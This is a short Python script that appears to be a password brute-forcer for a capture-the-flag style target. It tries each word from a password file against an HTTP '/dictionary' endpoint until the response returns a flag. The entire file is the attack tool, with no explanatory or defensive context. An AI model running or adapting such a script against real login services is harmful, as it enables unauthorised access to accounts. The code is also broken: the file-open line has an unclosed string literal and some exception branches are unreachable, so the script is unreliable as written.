import requests
import socket
from tqdm import tqdm


#function to check service is available
def check_ip_port(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=3):
            print(f"Connection to {ip}:{port} successful. Let's get it on!")
            return True
    except (socket.timeout, socket.error):
        print("Timeout")
        return False
    except ConnectionRefusedError:
        print("Service not available")
        return False
    except socket.gaierror:
        print("Request fail")
    except Exception as e:
        print(f"Unknown failure: {e}.")
        return False

ip = str(input("Enter valid IP: "))         #enter IP-Address
port = int(input("Enter valid Port: "))     #enter port

#open passwords file
file_dicitonary = open("path/to/file, "r")


#check connection
if check_ip_port(ip, port):

    #try passwords
    for password in tqdm(file_dicitonary, desc="Try something...", unit=" Words"):
        password = password.strip()
        response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

        if response.ok and 'flag' in response.json():   #.ok means status code 200
            print(f"\nWell, here we go: {password}")
            print(f"Flag: {response.json()['flag']}")
            file_dicitonary.close()
            break
else:
    print(f"Connection not possible.")
    file_dicitonary.close()
